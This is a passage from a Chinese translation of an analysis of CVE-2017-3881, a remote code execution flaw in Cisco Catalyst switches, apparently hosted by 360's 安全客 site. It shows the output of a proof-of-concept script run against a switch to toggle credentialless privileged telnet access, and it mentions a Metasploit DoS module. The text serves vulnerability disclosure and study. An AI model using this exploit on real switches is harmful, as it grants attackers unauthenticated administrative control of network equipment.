Model&nbsp;number&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;WS-C2960-48TT-L
...
Switch&nbsp;Ports&nbsp;Model&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SW&nbsp;Version&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SW&nbsp;Image&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
------&nbsp;-----&nbsp;-----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;----------&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;----------&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
*&nbsp;&nbsp;&nbsp;&nbsp;1&nbsp;50&nbsp;&nbsp;&nbsp;&nbsp;WS-C2960-48TT-L&nbsp;&nbsp;&nbsp;&nbsp;12.2(55)SE11&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C2960-LANBASEK9-M&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Configuration&nbsp;register&nbsp;is&nbsp;0xF</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">撤消更改:&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">$&nbsp;python&nbsp;c2960-lanbasek9-m-12.2.55.se11.py&nbsp;192.168.88.10&nbsp;--unset
[+]&nbsp;Connection&nbsp;OK
[+]&nbsp;Recieved&nbsp;bytes&nbsp;from&nbsp;telnet&nbsp;service:&nbsp;&#39;\xff\xfb\x01\xff\xfb\x03\xff\xfd\x18\xff\xfd\x1f\r\ncatalyst1#&#39;
[+]&nbsp;Sending&nbsp;cluster&nbsp;option
[+]&nbsp;Unsetting&nbsp;credless&nbsp;privilege&nbsp;15&nbsp;authentication
[+]&nbsp;All&nbsp;done
$&nbsp;telnet&nbsp;192.168.88.10
Escape&nbsp;character&nbsp;is&nbsp;&#39;^]&#39;.
User&nbsp;Access&nbsp;Verification
Password:</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这个RCE漏洞的POC代码可用于两种固件版本。这个漏洞利用代码的DoS版本可作为metasploit模块使用，适用于Cisco报告中提到的大多数型号的交换机。</span></p></p>
                <hr/>
                <p style="text-align: center;">
                    <img src="http://bobao.360.cn/img/app.jpeg"/>
                    <img src="http://bobao.360.cn/img/weixin.jpeg"/>
                </p>
                                <p>本文由 安全客 翻译，转载请注明“转自安全客”，并附上链接。<br/><a class="text-more" href="https://artkond.com/2017/04/10/cisco-catalyst-remote-code-execution/" target="_blank">原文链接：https://artkond.com/2017/04/10/cisco-catalyst-remote-code-execution/</a></p>
                            </div>
            <div style="margin-top: 20px;background-color:#FFFFFF">
    <input type="hidden" id="detail_title" name="detail_title" value="【漏洞分析】CVE-2017-3881：思科 Catalyst 交换机远程代码执行漏洞分析 - 安全客 - 有思想的安全新媒体" />
    <input type="hidden" id="use_nickname" name="use_nickname" value="0" />
    <a name="mao"></a>
    <div class="reg-log mobile-hiden">
        <div class="" id="userTo">   
            <div id="to-list" class="input-text" style="">
                <textarea disabled="disabled" class="hide"  id="comment-content" to="to"></textarea>
                <ul id="preadded" style="display:none">       
                </ul>
                <div id="to-auto" style="width: 200px">
                    <ul id="feed">
                    </ul>
                </div>
            </div>
        </div>
        <input type="hidden" id="source-id" value="3719" />
        <input type="hidden" id="source-type" value="learning" />
        <input type="hidden" id="post-comment-url" value="/comment/add" />
        <input type="hidden" id="post-nickname-url-ajax" value="/comment/randnicknameajax" />
        <input type="hidden" id="post-check-login-url-ajax" value="/comment/checklogin" />
        <input type="hidden" id="stoken_comment_set" value="ea3898fb4df38673fdeb61c458234054">                 <span class="join">参与讨论，请先 <a href="javascript:;" class="comment-login">登录</a> | <a href="javascript:;" class="comment-reg">注册</a> |  <a href="javascript:;" class="anonymous-comment">匿名评论</a></span>
            </div>
    <div class="mobile-hide" style="width: 870px; margin: 0 auto;">
        <label style="vertical-align:middle;" for="use_nickname">匿名</label> 
        <input style="vertical-align:middle;" id="trigger-nickname" name="use_nickname" class="use_nickname" type="checkbox" value="0" />

        <a href="javascript:;" class="apply-use button" id="submit-comment" data-target="/comment/add">发布</a>
    </div>


    <div class="clearfix"></div>
    <div class="comments">
        <div class="comments-head">
            <span class="title">用户评论</span>
        </div>
                <div class="comment-none alarm-info bg-primary">无任何评论</div>
            </div>
</div>
<script>
    $(function () {
        $('.anonymous-comment').click(function () {
            $(".join").hide();
            $(".reg-log textarea").first().removeAttr("disabled").show();
            $('#use_nickname').val('1');
//            $('#trigger-nickname').attr('checked', true);
            $('#trigger-nickname').trigger('click');
        });
        //为所有复选框绑定事件
//        checkbox_on_click();
        //ajax随机获取昵称
//        randnicknameajax(0);
        //ajax检测登录状态
        comment_check_login();
    });



    function input_checkbox(flag) {
        $('input:checkbox').each(function () {
            var value = flag ? 1 : 0;
            $(this).prop('checked', flag);
            $(this).val(value);
        });
    }

//ajax随机获取昵称
    function randnicknameajax(flag) {
        $.ajax({
            type: 'POST',
            url: $('#post-nickname-url-ajax').val(),
            data: {limit: 1, flag: flag},
            dataType: "json",
            success: function (data) {
                $('#nick-name').val(data.data[0]);
                _nick_name=data.data[0];
            }
        });
    }
    $();
//ajax检测登录状态
    function comment_check_login() {
        $.ajax({
            type: 'POST',
            url: $('#post-check-login-url-ajax').val(),
            data: {},
            dataType: "json",
            success: function (data) {
                if (data.success) {
                    $('.join').hide();
                    $(".reg-log textarea").first().removeAttr("disabled").show();
                    $("#span_use_nickname").show();
                    $('#use_nickname').val('0');
                    $('#use_nickname').attr('checked', false);
                }
            }
        });
    }
</script>        </div>
    </div>
    <div class="side-bar">
        <div class="mod hot-news">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-hot"></i><span>热门知识</span></h2>
    </div>
    <ul class="links-list">
                                <li><a href="/learning/detail/4411.html" alt="【漏洞预警】一个换行符引发的奥斯卡0day漏洞(CVE-2017-8759)重现——最新的Office高级威胁攻击预警" target="_blank">【漏洞预警】一个换行符引发的奥斯卡...</a></li>
                                <li><a href="/learning/detail/4416.html" alt="【漏洞预警】Microsoft .NET Framework漏洞（CVE–2017–8759）预警" target="_blank">【漏洞预警】Microsoft .NE...</a></li>
                                <li><a href="/learning/detail/4414.html" alt="【技术分享】妙用JavaScript绕过XSS过滤" target="_blank">【技术分享】妙用JavaScrip...</a></li>
                                <li><a href="/learning/detail/4418.html" alt="【技术分享】利用威胁情报数据平台拓展APT攻击线索一例" target="_blank">【技术分享】利用威胁情报数据平台拓...</a></li>
                                <li><a href="/learning/detail/4417.html" alt="【知识】9月15日 - 每日安全知识热点" target="_blank">【知识】9月15日 - 每日安全知识热...</a></li>
                                <li><a href="/learning/detail/4425.html" alt="【安全报告】XShellGhost事件技术回顾报告" target="_blank">【安全报告】XShellGhost事件...</a></li>
            </ul>
</div>        <!-- 友情链接 -->
        <div class="mod blog-links mobile-hide">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-link"></i><span>友情链接</span></h2>
        <a href="/links/index.html" class="more">更多<i></i></a>
    </div>
        <ul class="links-list">
                <li><a href="http://bbs.360safe.com" alt="360安全社区" target="_blank">360安全社区</a></li>
                <li><a href="http://zhuji.360.cn" alt="360主机卫士" target="_blank">360主机卫士</a></li>
                <li><a href="http://blogs.360.cn/" alt="奇虎360技术博客" target="_blank">奇虎360技术博客</a></li>
                <li><a href="http://wangzhan.360.cn/" alt="360网站卫士" target="_blank">360网站卫士</a></li>
                <li><a href="http://webscan.360.cn/" alt="360网站安全检测" target="_blank">360网站安全检测</a></li>
                <li><a href="http://research.360.cn/report/" alt="360研究报告" target="_blank">360研究报告</a></li>
                <li><a href="http://unicorn.360.cn/" alt="360 Unicorn Team" target="_blank">360 Unicorn Team</a></li>
                <li><a href="http://appscan.360.cn/" alt="360捉虫猎手" target="_blank">360捉虫猎手</a></li>
                <li><a href="https://threathunter.org/" alt="ThreatHunter社区" target="_blank">ThreatHunter社区</a></li>
                <li><a href="http://security.360.cn/" alt="360安全应急响应中心" target="_blank">360安全应急响应中心</a></li>
            </ul>
    </div>
        <!-- 联系我们 -->
        <div class="mod contact mobile-hide" style="text-align:center">
    <div class="head-bar clearfix">
        <h2><i></i><span>关注我们</span></h2>
    </div>
    <!-- 微信关注 -->
    <ul class="contact-way">
        <li><a>微信关注</a></li>
    </ul>
    <div style="padding-left:20px;padding-bottom:15px;">
    <img src="/img/qrcode_adlab_weixin.png?v=1.1"  width="145px" height="145px;"/>
    </div>
    
    <!-- APP下载 -->
    <ul class="contact-way">
        <li><a>安全播报APP</a></li>
    </ul>
    <div style="padding-left:20px;padding-bottom:15px;">
    <img src="/img/scan_code_big.png?v=1.1"  width="145px" height="145px;"/>
    </div>
    
</div>

    </div>
</div>

<script type="text/javascript" src="/js/jquery-ui.min.js?v=3.0"></script>
<script type="text/javascript" src="/js/jquery.noty.packaged.min.js?v=3.0"></script>
<script type="text/javascript" src="/js/common.js?v=4.5"></script>
<script>$(function() {sync_count('comment');});</script>


<!-- 语法高亮 -->
<script type="text/javascript" src="/ue/SyntaxHighlighter/shCore.js"></script>
<script type="text/javascript">SyntaxHighlighter.all();sync_count('vul');sync_count('news');sync_count('learning');sync_count('activity');sync_count('course');sync_count('ctf');</script>
    </div>

        <div class="footer">
        <div class="friend-link">
            <a href="http://www.360.cn/" target="_blank">360首页</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">关于我们</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">联系我们</a>
            <span>|</span>
            <a href="/links/index.html" target="_blank">友情链接</a>
            <span>|</span>
            <a href="/introduce/index" target="_blank">招贤纳士</a>
        </div>
        <div class="copy">
            Copyright &copy; 360网络攻防实验室 All Rights Reserved <span class="copy_icp">京ICP证080047号[京ICP备08010314号-6]</span>
        </div>
    </div>
    
</div>

<!--奇舞团统计-->

<script src='https://s.ssl.qhimg.com/static/f5407c785655e6a1/monitor_analytic.js'></script>
<script>
    monitor.setProject('QH_171_1').getTrack().getClickAndKeydown().getClickHeatmap(10, 1);
</script>

<div class="hide">
    <script src="https://s95.cnzz.com/z_stat.php?id=1253147824&web_id=1253147824" language="JavaScript"></script>
</div>
<div class="backToTop_wrap off">
    <a id="back_to_top" class="backToTop" href="javascript:;" title="返回顶部"></a>
</div>
<script>
    var $backToTop_wrap = $(".backToTop_wrap"),
        $backToTop_btn = $("#back_to_top");

    if ($(window).scrollTop() > 100) {
        $backToTop_wrap.removeClass("off");
    }
    else {
        $backToTop_wrap.addClass("off");
    }

    $(window).on("scroll", function () {
        if ($(this).scrollTop() > 100) {
            $backToTop_wrap.removeClass("off");
        }
        else {
            $backToTop_wrap.addClass("off");
        }
    });

    $backToTop_btn.on("click", function () {
        $("html, body").animate({scrollTop: 0}, 120);
    });

    $(function () {
        var navlist = $('.nav-list > li');

        navlist.each(function () {
            $(this).on('mouseenter', function () {
                $(this).addClass('selected');
            });

            $(this).on('mouseleave', function () {
                $(this).removeClass('selected');
            });
        });
    })
</script>



</body>
</html>
